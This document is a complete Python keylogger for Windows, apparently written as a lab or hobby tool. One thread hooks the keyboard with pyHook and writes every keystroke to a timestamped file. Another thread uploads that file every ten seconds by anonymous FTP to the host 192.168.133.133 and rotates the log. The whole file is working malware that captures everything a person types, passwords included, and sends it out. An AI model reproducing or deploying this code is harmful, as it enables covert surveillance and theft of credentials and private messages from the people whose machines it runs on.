import win32api, sys, pythoncom, pyHook, os, time, threading, ftplib


def OnKeyboardEvent(event):
	mut.acquire()
	f = open(fname, 'a')
	if event.Ascii != 0 and event.Ascii != 8:
		f.write(chr(event.Ascii))
	if event.Ascii == 13:
		f.write('\r\n')
	f.close()
	mut.release()


def keylogger():
	while True:
		hm = pyHook.HookManager() 
		hm.KeyDown = OnKeyboardEvent 
		hm.HookKeyboard() 
		pythoncom.PumpMessages()



def exfill():
	global fname
	while True:
		time.sleep(10)
		if os.path.exists(os.path.join(os.getcwd(), fname)):
			ftp = ftplib.FTP(host)
			ftp.login(user="anonymous", passwd="")
			ftp.cwd('./uploads')
			mut.acquire()
			f = open(fname, 'r')
			ftp.storlines('STOR {}'.format(fname), f)
			#os.remove(os.path.join(os.getcwd(), fname))
			fname = "keys_"+str(time.time()).split('.')[0]+".txt"
			ftp.close()
			mut.release()


fname = "keys_"+str(time.time()).split('.')[0]+".txt"
mut   = threading.Lock()
host  = "192.168.133.133"

t = threading.Thread(target=keylogger)
t.daemon = True
t.start()

p = threading.Thread(target=exfill)
p.daemon = True
p.start()

t.join()
p.join()

